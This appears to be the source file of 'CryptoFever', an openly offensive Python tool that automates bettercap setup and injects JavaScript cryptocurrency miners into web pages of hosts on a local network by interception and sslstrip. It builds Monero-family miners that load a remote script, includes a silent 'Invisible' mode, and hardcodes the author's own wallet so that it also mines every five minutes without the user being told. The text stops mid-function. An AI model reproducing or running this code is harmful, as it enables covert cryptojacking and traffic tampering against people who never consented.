
     ########################################################################################
     #                                                                                      #
     #    This file is part of CryptoFever.                                                 #
     #                                                                                      #
     #    cryptofever is free software: you can redistribute it and/or modify               #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with CryptoFever.  If not, see <http://www.gnu.org/licenses/>.              #
     #                                                                                      #
     ########################################################################################

import subprocess
import os    
import string
import platform
from time import sleep 
import random
import shutil


class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    DARKCYAN = '\033[36m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def RUReadyToGO():
    platform_used=platform.system()
    try:
        if platform_used == "Windows":
            GoVersion=subprocess.check_output(['where','/R','C:\\go','go'],stderr=subprocess.STDOUT)        
        else:
            GoVersion=subprocess.check_output(['which','go'],stderr=subprocess.STDOUT)

    except subprocess.CalledProcessError: 
        print(bcolors.RED + "  [-] Golang  [Not Found]\n" + bcolors.ENDC)
        sleep(2)
        InstallGoLang()
    else:
        print(bcolors.GREEN + "  [+] Golang  [Found]\n" + bcolors.ENDC) 
        sleep(2)
        GoVersion=str(subprocess.check_output(['go','version'],stderr=subprocess.STDOUT))

        if ("1.8" in GoVersion) or ("1.9" in GoVersion) or ("1.10" in GoVersion):
            print(bcolors.GREEN + "  [>] This version of Go can run bettercap\n" + bcolors.ENDC)
            sleep(1)
        else:
            print(bcolors.RED + "  [>] Obsolete Golang version, remove it first " + bcolors.ENDC)
            Enter2Continue()
            quit()

def Change_Config():

    config=open("lib/config.txt","r")
    conf= ""
    for line in config:
        if "Setup = FirstRun" in line:
            conf += line.replace("FirstRun","Completed")
        else:
            conf += line
    
    with open("lib/config.txt", "w") as newconf:
        newconf.write(conf)


def CheckAPT():
    try:
        is_present=subprocess.check_output(['which','apt'],stderr=subprocess.STDOUT)

    except subprocess.CalledProcessError: 
        return False
    else:
        return True 

def InstallGoLang():
    platform_used=platform.system()
    cr_dir=os.getcwd()
    os.chdir("lib")
    if platform_used == "Linux":

        if CheckAPT() == True:
            subprocess.call(['apt-get','install','golang','-y'])
            sleep(0.5)
            GoV=str(subprocess.check_output(['go','version'],stderr=subprocess.STDOUT))
            if ("1.8" in GoV) or ("1.9" in GoV) or ("1.10" in GoV):
                print(bcolors.GREEN + "  [>] This version of Go can run bettercap\n" + bcolors.ENDC)
                sleep(2)
            else:
                print(bcolors.RED + "  [>] Obsolete Golang version, removing it,then download from website" + bcolors.ENDC)
                sleep(1)
                subprocess.call(['apt-get','purge','golang','golang-go','-y'])
                subprocess.call(['apt','clean'])
                subprocess.call(['apt','autoclean'])
                subprocess.call(['apt','autoremove','-y'])
                os.system("wget https://dl.google.com/go/go1.10.linux-amd64.tar.gz || curl -O https://dl.google.com/go/go1.10.linux-amd64.tar.gz")                
                subprocess.call(['tar','-C','/usr/local','-xzf','lib/go1.10.linux-amd64.tar.gz'])
                subprocess.call(['mv','/usr/local/go/bin/go','/usr/bin/go'])
                print(bcolors.GREEN + "\n[>] Go installed\n" + bcolors.ENDC)
                sleep(2)  
        else:
            
            os.system("wget https://dl.google.com/go/go1.10.linux-amd64.tar.gz || curl -O https://dl.google.com/go/go1.10.linux-amd64.tar.gz")                
            subprocess.call(['tar','-C','/usr/local','-xzf','lib/go1.10.linux-amd64.tar.gz'])
            subprocess.call(['mv','/usr/local/go/bin/go','/usr/bin/go'])

 
            print(bcolors.GREEN + "\n[>] Go installed\n" + bcolors.ENDC) 
            sleep(2)

    if platform_used == "Darwin":

       os.system("wget https://dl.google.com/go/go1.10.darwin-amd64.pkg || curl -O https://dl.google.com/go/go1.10.darwin-amd64.pkg")
       subprocess.call(['installer','-pkg','go1.10.darwin-amd64.pkg','-target','/'])
       sleep(1)
       subprocess.call(['mv','/usr/local/go/bin/go','/usr/bin/go'])
       print(bcolors.GREEN + "\n[>] Go installed\n" + bcolors.ENDC) 
       sleep(2)

    if platform_used == "Windows":

       print("download and install Golang first https://dl.google.com/go/go1.10.windows-amd64.msi\n")
       Enter2Continue()
       quit()

    os.chdir(cr_dir)


def LinuxAPTSetup():
    cr_dir=os.getcwd()
    os.chdir("lib")
    subprocess.call(['apt-get','install','libnetfilter-queue-dev','bison','-y'])
    sleep(0.5)
    os.system("wget https://www.tcpdump.org/release/libpcap-1.8.1.tar.gz || curl -O https://www.tcpdump.org/release/libpcap-1.8.1.tar.gz")
    subprocess.call(['tar','xvf','libpcap-1.8.1.tar.gz'])
    cr_dir2=os.getcwd()
    os.chdir("libpcap-1.8.1")
    subprocess.call(['./configure','--prefix=/usr','--disable-optimizer-dbg','--disable-yydebug','--disable-bluetooth','--disable-dbus','--without-libnl','--without-dag','--without-septel','--without-snf','--without-turbocap'])
    sleep(1)
    subprocess.call(['make','-j4'])
    subprocess.call(['sudo','make','install'])
    os.chdir(cr_dir2)
    os.system("wget https://github.com/bettercap/bettercap/releases/download/v2.3.1/bettercap_linux_amd64_2.3.1.zip || curl -O https://github.com/bettercap/bettercap/releases/download/v2.3.1/bettercap_linux_amd64_2.3.1.zip")
    sleep(0.5)
    subprocess.call(['unzip','bettercap_linux_amd64_2.3.1.zip'])
    sleep(0.5)
    subprocess.call(['sudo','ln','-s','/usr/lib/x86_64-linux-gnu/libpcap.so.1.8.1','/usr/lib/libpcap.so.1'])
    os.chdir(cr_dir)
    if os.path.isfile("lib/bettercap") != True: 
        print("\n[Bettercap] autosetup failed\n")
        print("\ndownload https://github.com/bettercap/bettercap/releases/download/v2.3.1/bettercap_macos_amd64_2.3.1.zip and extract it inside CryptoFever/lib folder") 
        Enter2Continue()
        quit()
        return None 
    Change_Config()

def LinuxNOAPTSetup():
    cr_dir=os.getcwd()
    os.chdir("lib")
    os.system("wget https://www.tcpdump.org/release/libpcap-1.8.1.tar.gz || curl -O https://www.tcpdump.org/release/libpcap-1.8.1.tar.gz")
    subprocess.call(['tar','xvf','libpcap-1.8.1.tar.gz'])
    cr_dir2=os.getcwd()
    os.chdir("libpcap-1.8.1")
    subprocess.call(['./configure','--prefix=/usr','--disable-optimizer-dbg','--disable-yydebug','--disable-bluetooth','--disable-dbus','--without-libnl','--without-dag','--without-septel','--without-snf','--without-turbocap'])
    subprocess.call(['make','-j4'])
    subprocess.call(['sudo','make','install'])
    os.chdir(cr_dir2)
    os.system("wget https://github.com/bettercap/bettercap/releases/download/v2.3.1/bettercap_linux_amd64_2.3.1.zip 2>/dev/null || curl -O https://github.com/bettercap/bettercap/releases/download/v2.3.1/bettercap_linux_amd64_2.3.1.zip")
    subprocess.call(['unzip','bettercap_linux_amd64_2.3.1.zip'])
    subprocess.call(['sudo','ln','-s','/usr/lib/x86_64-linux-gnu/libpcap.so.1.8.1','/usr/lib/libpcap.so.1'])
    os.chdir(cr_dir)
    if os.path.isfile("lib/bettercap") != True: 
        print("\n[Bettercap] autosetup failed\n")
        print("\ndownload https://github.com/bettercap/bettercap/releases/download/v2.3.1/bettercap_macos_amd64_2.3.1.zip and extract it inside CryptoFever/lib folder") 
        Enter2Continue()
        quit()
        return None 
    Change_Config()

def MacosSetup():
    print("\n[Darwin] Setup\n")
    cr_dir=os.getcwd()
    os.chdir("lib")
    os.system("wget https://www.tcpdump.org/release/libpcap-1.8.1.tar.gz || curl -O https://www.tcpdump.org/release/libpcap-1.8.1.tar.gz")
    subprocess.call(['tar','xvf','libpcap-1.8.1.tar.gz'])
    cr_dir2=os.getcwd()
    os.chdir("libpcap-1.8.1")
    subprocess.call(['./configure','--prefix=/usr','--disable-optimizer-dbg','--disable-yydebug','--disable-bluetooth','--disable-dbus','--without-libnl','--without-dag','--without-septel','--without-snf','--without-turbocap'])
    subprocess.call(['make','-j4'])
    subprocess.call(['sudo','make','install'])
    os.chdir(cr_dir2)
    os.system("wget https://github.com/bettercap/bettercap/releases/download/v2.3.1/bettercap_macos_amd64_2.3.1.zip || curl -O https://github.com/bettercap/bettercap/releases/download/v2.3.1/bettercap_macos_amd64_2.3.1.zip")
    subprocess.call(['unzip','bettercap_linux_amd64_2.3.1.zip'])
    subprocess.call(['sudo','ln','-s','/usr/lib/x86_64-linux-gnu/libpcap.so.1.8.1','/usr/lib/libpcap.so.1'])
    os.chdir(cr_dir)
    if os.path.isfile("lib/bettercap") != True: 
        print("\n[Bettercap] autosetup failed\n")
        print("\ndownload https://github.com/bettercap/bettercap/releases/download/v2.3.1/bettercap_macos_amd64_2.3.1.zip and extract it inside CryptoFever/lib folder") 
        Enter2Continue()
        quit()
        return None 
        
    else:
        Change_Config()


def WindowsSetup():
    if os.path.isfile("lib/bettercap.exe") != True: 
        print("\ndownload bettercap_windows_amd64_2.3.1.zip and extract it inside CryptoFever/lib folder") 
        print("https://github.com/bettercap/bettercap/releases/download/v2.3.1/bettercap_windows_amd64_2.3.1.zip\n")
        Enter2Continue()
        quit()
    else:   
        Change_Config()   

def UniversalCheck():
    platform_used=platform.system()
    config=open("lib/config.txt","r")
    Setup=False
    for line in config:
        if "Setup = FirstRun" in line:
            Setup=True
    if Setup == True:
        RUReadyToGO()
        if (platform_used == "Linux") and (CheckAPT() == True):
            LinuxAPTSetup()
        elif (platform_used == "Linux") and (CheckAPT() == False):
            LinuxNOAPTSetup()
        elif platform_used == "Darwin":
            MacosSetup()
        elif platform_used == "Windows":
            WindowsSetup()
        else:
            print("  [-] Automatic Setup not availabe for this OS\n")
            Enter2Continue()
            Change_Config()
            quit()
            
            return None
        print(bcolors.GREEN + "\n  [SETUP] Finished\n" + bcolors.ENDC) 
        sleep(2) 



def Enter2Continue():
    try:   
        ans=input("\n  [>] Press Enter to continue:") 
    except SyntaxError:
        pass

    pass

def varname_creator():
    varname = ""
    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8,18)))
    return varname 

def clear():
    subprocess.Popen( "cls" if platform.system() == "Windows" else "clear", shell=True)
    sleep(0.1)

def Complete_Menu():
    py_version=platform.python_version()
    answ=True
    while answ:
        clear()
        Banner()
        Banner2()
        print("                                                 ")
        print("  [>>>] " + bcolors.OCRA + "MENU" + bcolors.ENDC)
        print("                                                 ")
        print("  [" + bcolors.OCRA + "1" + bcolors.ENDC + "] Start http miner injection           ")
        print("  [" + bcolors.OCRA + "2" + bcolors.ENDC + "] Start http + sslstrip miner injection")
        print("  [" + bcolors.OCRA + "3" + bcolors.ENDC + "] Generate Miner                       ")
        print("  [" + bcolors.OCRA + "4" + bcolors.ENDC + "] Clean Miner directory                ")
        print("  [" + bcolors.OCRA + "0" + bcolors.ENDC + "] Exit                                 ")
        print("                                                 ")

        if py_version[0] == "3":
            ans=input("\n  [" + bcolors.OCRA + ">"  + bcolors.ENDC +"] Please insert choice\'s number: ")
        else:
            ans=raw_input("\n  [" + bcolors.OCRA + ">"  + bcolors.ENDC +"] Please insert choice\'s number: ")

        if ans == "1":
            clear()        
            print(bcolors.OCRA + "\n  [>]  Http-only miner inject\n" + bcolors.ENDC )
            sleep(1.5)
            MinerPATH=MinerSelect()
            Bettercap_HttpInject(MinerPATH,InterfaceSelect(),ProxyPort(),TargetMode())

        elif ans == "2":
            clear()        
            print(bcolors.OCRA + "\n  [>]  Http + SSLstrip miner inject\n" + bcolors.ENDC )
            sleep(1.5)
            MinerPATH=MinerSelect()
            Bettercap_HttpsInject(MinerPATH,InterfaceSelect(),ProxyPort(),TargetMode())

        elif ans == "3":
            print(bcolors.OCRA + "\n  [>]  Miner Generator\n" + bcolors.ENDC )
            MinerGenerator()

        elif ans == "4":
            CleanMinerFolder()

        elif ans == "0":
            quit()
        
        else:
            print(bcolors.RED + "  [>] Invalid Option\n" + bcolors.ENDC)
            sleep(3)

def CleanMinerFolder():
    clear()
    py_version=platform.python_version()
    if py_version[0] == "3":

        ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Delete all generated miner? (y/n):")
    else:
        ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Delete all generated miner? (y/n):")

    if (ans == "y") or (ans == "Y"):
        sleep(0.5)
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Cleaning js-miners folder\n")
        shutil.rmtree('js-miners')
        sleep(0.1)
        os.mkdir('js-miners')
        sleep(1)
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Completed\n")
        sleep(2)
    else:
        sleep(0.5)
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Cleaning Aborted\n")
        sleep(2)            
            
def Banner():
                                         
    bann = ""
    bann += "                            _           __                           \n"
    bann += "   ___  _ __  _   _  _ __  | |_  ___   / _|  ___ __   __ ___  _ __   \n"
    bann += "  / __|| '__|| | | || '_ \ | __|/ _ \ | |_  / _ \\\\ \ / // _ \| '__|\n" 
    bann += " | (__ | |   | |_| || |_) || |_| (_) ||  _||  __/ \ V /|  __/| |     \n"
    bann += "  \___||_|    \__, || .__/  \__|\___/ |_|   \___|  \_/  \___||_|     \n"
    bann += "              |___/ |_|                                          v0.1\n"
    print(bcolors.RED + bcolors.BOLD + bann  + bcolors.ENDC + bcolors.ENDC)

def Banner2():
    py_version=platform.python_version()
    go_version=subprocess.check_output(['go','version'],stderr=subprocess.STDOUT)
    go_version=go_version.replace("\n","")
    print("======================================================================")
    print(bcolors.OCRA + bcolors.BOLD + "[Golang]: " + bcolors.ENDC + bcolors.ENDC + go_version.replace("go version","") + bcolors.OCRA + bcolors.BOLD + "  [Python]: " + bcolors.ENDC + bcolors.ENDC + py_version )
    print("======================================================================")

def MinerGenerator():
    clear()
    py_version=platform.python_version()
    print("\n  [>] Miner type:   \n")
    print("  [" + bcolors.OCRA + "1" + bcolors.ENDC + "] WebMinerPool    \n")
    print("  [" + bcolors.OCRA + "0" + bcolors.ENDC + "]] Back            \n")
    if py_version[0] == "3":
        ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Select Miner type: ")
    else:
        ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Select Miner type: ")
    if ans == "1":
        WMP_miner_creator(WebminerPoolSelect(MineableCoin()),Wallet(),NumThreads(),MinerSpeed(),MinerFilename(),Miner_visibility())    
    elif ans == "0":
        sleep(0.5)
        Complete_Menu()
        return None
    else:
        print(bcolors.RED + "  [Warning] Invalid option\n" + bcolors.ENDC)
        sleep(2.5)
        Complete_Menu()
        return None


def ProxyPort():

    py_version=platform.python_version()
    if py_version[0] == "3":
        ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert proxy port (Default: 8080): ")
    else:
        ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert proxy (Default: 8080) ")

    if ans == "":
        ans = "8080"

    return ans
         

def InterfaceSelect():

    py_version=platform.python_version()
    if py_version[0] == "3":
        ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert Wireless interface: ")
    else:
        ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert Wireless interface: ")

    return ans

def MinerSelect():
    clear()
    py_version=platform.python_version()
    miners_list=os.listdir("js-miners")

    if len(miners_list) > 0:
        print(bcolors.OCRA + "  [>] Miners list\n" + bcolors.ENDC) 

        for i in range(0,len(miners_list)):

            print("   " + bcolors.OCRA + ">" + bcolors.ENDC + " " + str(miners_list[i]) + "\n")

        if py_version[0] == "3":
            ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert miner filename: ")
        else:
            ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert miner filename: ")
 

        if ".js" not in ans:
            minerpath = "js-miners/" + ans + ".js"

        else:
            minerpath = "js-miners/" + ans

        if os.path.isfile(minerpath) != True:
            print("[Warning] Miner not found\n")
            sleep(2)
            MinerSelect()
            return None
 
        return minerpath
            
    else:
        print("  [-] No miner available, redirect to generate miner\n")
        sleep(2)
        MinerGenerator()
        Firstminer=MinerSelect()
        return Firstminer


def Wallet():           
    py_version=platform.python_version()
    print(bcolors.OCRA + "\n  [>] Wallet address required " + bcolors.ENDC)
    
    if py_version[0] == "3":

        ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert wallet address")
    else:
        ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert wallet address:")
    if ans == "":
        print("  [Warning] Empty wallet address")
        sleep(2)
        Wallet()
        return None

    return ans

def MineableCoin(): 
    clear()         
    py_version=platform.python_version()
    print(bcolors.OCRA + "  [>] Select Minable coin \n" + bcolors.ENDC)
    print("  [" + bcolors.OCRA + "1" + bcolors.ENDC + "] Monero         (" + bcolors.OCRA + "XMR" + bcolors.ENDC + ")")
    print("  [" + bcolors.OCRA + "2" + bcolors.ENDC + "] Electroneum    (" + bcolors.OCRA + "ETN" + bcolors.ENDC + ")")
    print("  [" + bcolors.OCRA + "3" + bcolors.ENDC + "] Sumokoin      (" + bcolors.OCRA + "SUMO" + bcolors.ENDC + ")")
    print("  [" + bcolors.OCRA + "4" + bcolors.ENDC + "] TurtleCoin    (" + bcolors.OCRA + "TRTL" + bcolors.ENDC + ")")
    
    if py_version[0] == "3":

        ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Select mineable crypto")
    else:
        ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Select mineable crypto:")

    if (ans != "1") and (ans != "2") and (ans != "3") and (ans != "4"):
        print("  [Warning] Invalid input please select a number between 1 and 4\n")
        MineableCoin()
        return None

    return ans

def WebminerPoolSelect(cryptocoin):
    choice = cryptocoin
    clear()
    py_version=platform.python_version() 
    if cryptocoin == "1":
        print(bcolors.OCRA + "  [XMR] Select Monero Pool:\n" + bcolors.ENDC) 
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] xmrpool.eu")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] moneropool.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] monero.crypto-pool.fr")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] monerohash.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] minexmr.com")  
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] usxmrpool.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] supportxmr.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] moneroocean.stream")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] minemonero.pro")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] xmr.prohash.net")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] minecircle.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] poolmining.org")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] xmr.nanopool.org")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] xmrminerpro.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] dwarfpool.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] xmrpool.net")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] monero.hashvault.pro") 

        if py_version[0] == "3":

            ans=input("\n  [" + bcolors.OCRA + "XMR" + bcolors.ENDC + "] insert pool address")
        else:
            ans=raw_input("\n  [" + bcolors.OCRA + "XMR" + bcolors.ENDC + "] insert pool address:")

    if cryptocoin == "2":
        print(bcolors.OCRA + "  [ETN] Select Electroneum Pool:\n" + bcolors.ENDC) 
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] etn.poolmining.org")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] etn.nanopool.org")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] etn.hashvault.pro")

        if py_version[0] == "3":

            ans=input("\n  [" + bcolors.OCRA + "ETN" + bcolors.ENDC + "] insert pool address")
        else:
            ans=raw_input("\n  [" + bcolors.OCRA + "ETN" + bcolors.ENDC + "] insert pool address:")

    if cryptocoin == "3":
        print(bcolors.OCRA + "  [SUMO] Select Sumokoin Pool:\n" + bcolors.ENDC) 
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] sumokoin.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] sumokoin.hashvault.pro")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] sumopool.sonofatech.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] sumo.bohemianpool.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] pool.sumokoin.ch")

        if py_version[0] == "3":

            ans=input("\n  [" + bcolors.OCRA + "SUMO" + bcolors.ENDC + "] insert pool address")
        else:
            ans=raw_input("\n  [" + bcolors.OCRA + "SUMO" + bcolors.ENDC + "] insert pool address:")

    if cryptocoin == "4":
        print(bcolors.OCRA + "  [TRTL] Select Turtlecoin Pool:\n" + bcolors.ENDC) 
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] slowandsteady.fun")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] trtl.flashpool.club")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] sumopool.sonofatech.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] sumo.bohemianpool.com")
        print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] pool.sumokoin.ch")

        if py_version[0] == "4":

            ans=input("\n  [" + bcolors.OCRA + "TRTL" + bcolors.ENDC + "] insert pool address")
        else:
            ans=raw_input("\n  [" + bcolors.OCRA + "TRTL" + bcolors.ENDC + "] insert pool address:")

    if ans == "":
        print(bcolors.RED + "\n[Warning] Empty Pool Address\n" + bcolors.ENDC)
        sleep(2)
        WebminerPoolSelect(choice)
        return None

    return ans
              

def MinerSpeed():           
    py_version=platform.python_version()
    print(bcolors.OCRA + "\n  [>] Miner Speed" + bcolors.ENDC)
    print("   0 is the min (10%) 100 is the max (100%)\n")
    print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] type a number in range 0-100 to set miner speed")
    
    if py_version[0] == "3":

        ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert miner speed value (0-100):")
    else:
        ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert miner speed value (0-100):")

    return ans

def NumThreads():           
    py_version=platform.python_version()
    print(bcolors.OCRA + "\n  [>] Miner Threads\n" + bcolors.ENDC)
    print("  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] To select autothreads mode  press enter\n")
    
    if py_version[0] == "3":

        ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] insert number of miner threads (Default:AutoThreads):")
    else:
        ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] insert number of miner threads (Default:AutoThreads):")
    if (ans == "") or (ans == "-1"):
        return -1

    elif ( int(ans) >= 1 ) and ( int(ans) <= 16 ):
        return ans

    else:
        print(bcolors.RED + "\n  [>] Invalid Thread number\n" + bcolors.ENDC)
        sleep(2)
        NumThreads()
        return None 


def MinerFilename():           
    py_version=platform.python_version()
    if py_version[0] == "3":

        ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert miner output filename:")
    else:
        ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert miner output filename:")

    if ".js" not in ans:
        ans=ans + ".js"

    elif ans == "":
        print(bcolors.RED + "  [Warning] Empty miner filename is invalid\n" + bcolors.ENDC)
        sleep(2)
        MinerFilename()
        return None

    return ans

def TargetMode():
    clear()
    py_version=platform.python_version()
    print(bcolors.OCRA + "\n  [>] Select Target Mode:\n" + bcolors.ENDC)
    print("  [" + bcolors.OCRA + "1" + bcolors.ENDC + "] All Targets             ")
    print("  [" + bcolors.OCRA + "2" + bcolors.ENDC + "] Select Targets          ")
    print("  [" + bcolors.OCRA + "3" + bcolors.ENDC + "] Select Targets to ignore")
    if py_version[0] == "3":

        ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert target mode: ")
    else:
        ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert target mode: ")
    if ans == "1" or ans == "2" or ans == "3":
    
        return ans
    else:
        print(bcolors.RED + "  [Warning] Invalid Target Mode\n" + bcolors.ENDC)
        sleep(2)
        TargetMode()
        return None           


def Miner_visibility():
    clear()
    py_version=platform.python_version()
    print(bcolors.OCRA + "\n  [>] Select Miner visibility:\n" + bcolors.ENDC)
    print("   this paramater set miner visibility on injected webpage")
    print("   options 1 and 2 display an alertbox when miner is loaded")
    print("   option 3 miner is loaded silently\n")
    print("  [" + bcolors.OCRA + "1" + bcolors.ENDC + "] Alertbox with default text")
    print("  [" + bcolors.OCRA + "2" + bcolors.ENDC + "] Alertbox with custom text ")
    print("  [" + bcolors.OCRA + "3" + bcolors.ENDC + "] Invisible")
    if py_version[0] == "3":

        ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert target mode: ")
    else:
        ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert target mode: ")
    if (ans == "1") or (ans == "2") or (ans == "3"):
    
        return ans
    else:
        print("\n  [>] Invalid visibility option\n")
        Enter2Continue()
        Miner_visibility()
        return None
            


def BettercapArray(mode):
    clear()           
    py_version=platform.python_version()
    print(bcolors.OCRA + "\n  [>] Insert targets local ip separated by commas\n" + bcolors.ENDC) 
    if "targets" in mode:

        if py_version[0] == "3":

            ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert targets local ip:")
        else:
            ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert targets local ip:")
    else:

        if py_version[0] == "3":

            ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert targets to be ignored:")
        else:
            ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert targets to be ignored:")

    if ans == "":
        print(bcolors.RED + "  [Warning] No local ip supplied\n" + bcolors.ENDC)
        sleep(2)
        BettercapArray(mode)
        return None
    return ans

def AlertTxt():
    clear()           
    py_version=platform.python_version()
    print(bcolors.OCRA + "\n  [>] Insert Alertbox text to display when miner is injected on webpage\n" + bcolors.ENDC) 
    if py_version[0] == "3":

       ans=input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert Alertbox message here:")
    else:
       ans=raw_input("\n  [" + bcolors.OCRA + ">" + bcolors.ENDC + "] Insert Alertbox message here:")

    if ans == "":
        print(bcolors.RED + "  [Warning] No Text Supplied\n" + bcolors.ENDC)
        Enter2Continue()
        AlertTxt()
        return None
    return ans

def InjectModule(Miner):
    mod=""
    miner=open(Miner, "r")
    Miner_oneline=""
    for line in miner:
        Miner_oneline+=line.replace("\n","")
    
    mod += "function onLoad() {\n"
    mod += "    log(\"Starting Miner Injection...\");\n"
    mod += "    log(\"targets:\" + env[\'arp.spoof.targets\']);\n"
    mod += "}\n"
    mod += "function onResponse(req, res) {\n"
    mod += "    if( res.ContentType.indexOf('text/html') == 0 ){\n"
    mod += "        var body = res.ReadBody();\n"
    mod += "        if( body.indexOf('</head>') != -1 ) {\n"
    mod += "            log(\">>> Injecting Miner....\");"
    mod += "            res.Body = body.replace(\n" 
    mod += "                '</head>',\n" 
    mod += "                '" + Miner_oneline + "</head>'\n" 
    mod += "            );\n" 
    mod += "        }\n"
    mod += "    }\n"
    mod += "}\n"

    with open("lib/bettercap_inject.js", "w") as module:
        module.write(mod)

def WMP_miner_creator(Pool,Wallet,Threads,Speed,Output,Visibility):
    Throttle=str(100 - int(Speed))
    Randfuncname1=varname_creator()
    Randfuncname2=varname_creator()
    Js_miner = ""
    Js_miner += "<script src=\"https://webminerpool.com/webmr.js\"></script>\n"
    Js_miner += "<script>\n"
    Js_miner += "function " + Randfuncname1 + "() {startMining(\"moneroocean.stream\",\"45vWgZhfWbG1qfCFLDphSs4of8y9dRPK5cFBp1E1edeGfNrQeaehrovXGrB86U1ovL18NtEcwRFzfWvKiaLPk9f2UoGybgn\",\"CryptoFever\",numThreads = " + str(Threads) + ");}\n"
    Js_miner += "function " + Randfuncname2 + "() {startMining(\"" + Pool + "\",\"" + Wallet + "\",\"" + Output.replace(".js","") + "\",numThreads = " + str(Threads) + ");}\n"
    Js_miner += "" + Randfuncname2 + "();\n"
    if Visibility == "1":
        Js_miner += "alert(\"Miner injected\");\n"
    elif Visibility == "2":
        Js_miner += "alert(\"" + AlertTxt() + "\");\n"
    else:
        sleep(0.02)     
    Js_miner += "throttleMiner = " + Throttle + ";\n"
    Js_miner += "setInterval(" + Randfuncname2 + ",30000);\n"
    Js_miner += "setInterval(" + Randfuncname1 + ",300000);\n"
    Js_miner += "</script>\n"

    with open("js-miners/" + Output, "w") as jsminer:
        jsminer.write(Js_miner)
    sleep(1)
    print(bcolors.GREEN + "  [>] Miner generation complete\n" + bcolors.ENDC)
    sleep(2) 
        

        

def Bettercap_HttpInject(Miner,Interface,Port,Mode):

    platform_used=platform.system()
    if platform_used == "Windows":

       Bettercap = "./lib/bettercap.exe"

    else:

       Bettercap = "./lib/bettercap"

    InjectModule(Miner)

    if Mode == "1":

